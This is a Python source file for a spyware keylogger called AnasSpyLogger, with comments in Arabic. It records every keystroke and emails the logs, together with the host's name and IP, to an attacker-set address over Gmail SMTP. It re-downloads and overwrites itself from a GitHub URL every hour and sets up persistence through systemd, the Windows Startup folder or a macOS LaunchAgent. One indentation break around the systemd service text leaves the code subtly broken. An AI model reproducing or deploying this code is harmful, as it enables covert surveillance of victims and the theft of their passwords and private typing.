import os
import platform
import threading
import time
import datetime
import requests
from pynput import keyboard
import smtplib
from email.message import EmailMessage
import socket
import subprocess
    

# ===== التحقق من وجود config.py وإنشاؤه إذا لم يكن موجوداً =====
CONFIG_FILE = 'config.py'
def check_or_create_config():
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'w') as f:
            f.write("EMAIL_ADDRESS = 'default_email'\n")
            f.write("EMAIL_PASSWORD = 'default_password'\n")
            f.write("TO_EMAIL = 'default_receiver'\n")

check_or_create_config()

# ===== تحميل البيانات من config.py =====
config_data = {}
with open(CONFIG_FILE, 'r') as f:
    exec(f.read(), config_data)

EMAIL_ADDRESS = config_data.get('EMAIL_ADDRESS', 'default_email')
EMAIL_PASSWORD = config_data.get('EMAIL_PASSWORD', 'default_password')
TO_EMAIL = config_data.get('TO_EMAIL', 'default_receiver')
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# ===== إعدادات النظام والسجل =====
os_info = platform.system()
log_file = "keylogs.txt"
buffer = []
buffer_limit = 50
update_url = "https://raw.githubusercontent.com/anaslabrini/AnasSpyLogger/refs/heads/main/tool/anasspylogger.py"  # رابط التحديث المباشر للسكريبت

# ===== تحويل المفاتيح الخاصة إلى نصوص بشرية =====
key_mapping = {
    'Key.space': '[SPACE]',
    'Key.enter': '[ENTER]',
    'Key.tab': '[TAB]',
    'Key.backspace': '[BACKSPACE]',
    'Key.shift': '[SHIFT]',
    'Key.ctrl_l': '[CTRL]',
    'Key.ctrl_r': '[CTRL]',
    'Key.alt_l': '[ALT]',
    'Key.alt_r': '[ALT]',
    'Key.esc': '[ESC]',
    'Key.caps_lock': '[CAPS LOCK]',
    'Key.num_lock': '[NUM LOCK]',
    'Key.scroll_lock': '[SCROLL LOCK]',
    'Key.f1': '[F1]', 'Key.f2': '[F2]', 'Key.f3': '[F3]', 'Key.f4': '[F4]', 'Key.f5': '[F5]',
    'Key.f6': '[F6]', 'Key.f7': '[F7]', 'Key.f8': '[F8]', 'Key.f9': '[F9]', 'Key.f10': '[F10]',
    'Key.f11': '[F11]', 'Key.f12': '[F12]',
}

# ===== إرسال البريد =====
# ===== إرسال البريد =====
def send_email(subject, content):
    try:
        msg = EmailMessage()
        msg['Subject'] = subject
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL
        msg.set_content(content)

        # استخدام التوقيت الحالي في اسم الملف
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        log_filename = f'keylogs_{timestamp}.txt'

        with open(log_filename, 'w') as f:
            f.write(content)

        with open(log_filename, 'rb') as f:
            msg.add_attachment(f.read(), maintype='text', subtype='plain', filename=log_filename)

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
            smtp.starttls()
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
        
        print(f"[+] Email sent with log file: {log_filename}")

    except Exception as e:
        print(f"[-] Email error: {e}")

# ===== إرسال إشعار بدء التشغيل =====
def send_startup_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        system_info = f"System: {platform.system()} {platform.release()}\nHostname: {hostname}\nIP: {local_ip}"
        send_email("System Startup Notification", system_info)
    except Exception as e:
        print(f"[-] Error sending startup info: {e}")

# ===== تحديث السكربت =====
def update_script():
    try:
        response = requests.get(update_url, timeout=10)
        if response.status_code == 200:
            with open(__file__, 'w') as f:
                f.write(response.text)
            print("[+] Script updated successfully.")
        else:
            print(f"[-] Failed to download update. Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Update error: {e}")

# ===== التقاط الضغطات =====
def on_press(key):
    try:
        key_text = str(key.char) if hasattr(key, 'char') else str(key)
        if key_text in key_mapping:
            key_text = key_mapping[key_text]
    except:
        key_text = str(key)

    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_line = f"[{timestamp}] {key_text}"
    buffer.append(log_line)

    if len(buffer) >= buffer_limit:
        with open(log_file, 'a') as f:
            f.write('\n'.join(buffer) + '\n')
        send_email("AnasSpyLogger Report", '\n'.join(buffer))
        buffer.clear()

# ===== بدء تشغيل اللوجر =====
def start_logger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# ===== حفظ البرنامج في الخلفية =====

def persist_script():
    system = platform.system()

    if system == "Linux":
        print("[*] System: Linux - Setting up systemd service...")
        user_service_path = os.path.expanduser("~/.config/systemd/user")
        os.makedirs(user_service_path, exist_ok=True)

        service_file_path = os.path.join(user_service_path, "anaspylogger.service")


service_content = f"""[Unit]
Description=AnasSpyLogger Persistence Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""

        # إنشاء ملف الخدمة
        with open(service_file_path, 'w') as f:
            f.write(service_content)

        print(f"[+] Service created: {service_file_path}")

        # إعادة تحميل الخدمات الخاصة بالمستخدم
        subprocess.run(["systemctl", "--user", "daemon-reload"])

        # تفعيل وتشغيل الخدمة
        subprocess.run(["systemctl", "--user", "enable", "anaspylogger.service"])
        subprocess.run(["systemctl", "--user", "start", "anaspylogger.service"])

        print("[+] Service enabled and started.")

    elif system == "Windows":
        print("[*] System: Windows - Setting up Startup script...")
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        target_path = os.path.join(startup_folder, "AnasSpyLogger.bat")
        with open(target_path, 'w') as f:
            f.write(f"@echo off\nstart pythonw {os.path.abspath(__file__)}\n")

    elif system == "Darwin":
        print("[*] System: macOS - Setting up Launch Agent...")
        launch_agents_path = os.path.expanduser("~/Library/LaunchAgents")
        os.makedirs(launch_agents_path, exist_ok=True)

        plist_file_path = os.path.join(launch_agents_path, "com.anasspylogger.plist")

        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.anasspylogger</string>
            <key>ProgramArguments</key>
            <array>
                <string>/usr/bin/python3</string>
                <string>{os.path.abspath(__file__)}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
        </dict>
        </plist>
        """

        with open(plist_file_path, 'w') as f:
            f.write(plist_content)

        # تحميل الـ plist لتشغيله فورًا
        subprocess.run(["launchctl", "load", plist_file_path])

        print(f"[+] Launch Agent created: {plist_file_path}")

# ===== تشغيل البرنامج بشكل دائم =====
def run_every_hour():
    while True:
        time.sleep(3600)
        update_script()  # تحديث السكربت كل ساعة

# ===== تشغيل السكربت =====
if __name__ == "__main__":
    threading.Thread(target=start_logger, daemon=True).start()  # بدء اللوجر
    send_startup_info()  # إرسال إشعار عند تشغيل النظام
    update_script()  # تحديث السكربت في البداية
    persist_script()  # حفظ السكربت ليعمل تلقائيًا عند بدء النظام
    run_every_hour()  # تحديث السكربت كل ساعة
